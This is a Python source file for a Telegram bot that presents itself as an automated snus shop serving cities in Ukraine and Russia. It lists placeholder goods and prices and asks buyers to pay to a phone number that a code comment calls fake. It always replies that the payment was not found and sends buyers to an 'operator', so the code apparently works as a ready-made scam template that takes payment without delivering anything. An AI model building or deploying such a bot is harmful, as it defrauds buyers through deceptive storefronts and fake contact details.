# CODED BY @OLDIESUGAR #

import telebot
import random


kb = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True) # клавиатура
kb.row('🚀Каталог') # кнопочки
kb.row('📦Активные доставки')
kb.row('💻Тех. Поддержка')
kb.row('🏙Доступные города')

po = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True) # клавиатура
po.row('✅ Подтвердить оплату') # кнопочки
po.row('❌ Отменить заказ')

tovar1 = ('Corvus - 645₽') # товар в каталоге
tovar2 = ('Лалала - 999₽')
tovar3 = ('Бебебебе - 1.999₽')
tovar4 = ('Блаблабла - 59.999₽')
cenatovar1 = ('645₽')
cenatovar2 = ('999₽')
cenatovar3 = ('1.999₽')
cenatovar4 = ('59.999₽')

kat = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True) # клавиатура
kat.row(tovar1) # кнопочки
kat.row(tovar2)
kat.row(tovar3)
kat.row(tovar4)
kat.row('Вернуться')

op = ('@OldiSugar') # Ник телеграмма оператора
numb = ('+777777777') # Фейк Номер телефона
oplata = ('+777777777')
nomerplat1 = random.randint(11111, 99999)
nomerplat2 = random.randint(11111, 99999)
nomerplat3 = random.randint(11111, 99999)
nomerplat4 = random.randint(11111, 99999)

bot = telebot.TeleBot('12312321') # токен бота
@bot.message_handler(content_types=['text']) 


def handler_zz_gg(message):
    id = message.chat.id
    tx = message.text
    if tx == '/start': 
        bot.send_message(id, 'Привет! Это бот АвтоПродаж снюса. \nПочему именно мы?\n1.Всё автоматическое, не надо ждать по 2-4 дня для проверки заявки\n3. Быстрая доставка\n4. Качество', reply_markup=kb)
    elif tx == '🚀Каталог':
        bot.send_message(id, 'Весь каталог:', parse_mode='Markdown', reply_markup=kat)
    elif tx == '🏙Доступные города':
        bot.send_message(id, '🇺🇦Украина: *Киев, Житомир, Одесса, Харьков, Днепро, Сумы.*\n🇷🇺Россия: *Москва, Санкт-Питербург, Красноярск, Омск, Сочи*', parse_mode='Markdown', reply_markup=kb)
    elif tx == '📦Активные доставки':
        bot.send_message(id, '📦 Ваши активные доставки: *Тут пока пусто :<*', parse_mode='Markdown', reply_markup=kb)
    elif tx == 'Вернуться':
        bot.send_message(id, 'Вы вернулись на главную страницу', parse_mode='Markdown', reply_markup=kb)
    elif tx == '💻Тех. Поддержка':
        bot.send_message(id, '✅ *Активный оператор* который сможет вам помочь в любой ситуации: '+op+' \nЕсли вам не смогли помочь онлайн, позвоните по этому номеру: '+numb, parse_mode='Markdown', reply_markup=kb)
    elif tx == tovar1:
        bot.send_message(id, 'Товар: '+tovar1+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar1+'*\nНомер заказа, примечание к платежу: *'+str(nomerplat1)+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)
    elif tx == tovar2:
        bot.send_message(id, 'Товар: '+tovar2+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar2+'*\nНомер заказа, примечание к платежу: *'+str(nomerplat2)+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)    
    elif tx == tovar3:
        bot.send_message(id, 'Товар: '+tovar3+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar3+'*\nНомер заказа, примечание к платежу: *'+str(nomerplat3)+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)    
    elif tx == tovar4:
        bot.send_message(id, 'Товар: '+tovar4+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar4+'*\nНомер заказа, примечание к платежу: *'+str(nomerplat4)+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)
    elif tx == '✅ Подтвердить оплату':
        bot.send_message(id, '❌ Платёж *не найден* ❌', parse_mode='Markdown', reply_markup=po)
    elif tx == '❌ Отменить заказ':
        bot.send_message(id, '✅ Вы успешно *отменили* заказ', parse_mode='Markdown', reply_markup=kb)


bot.polling()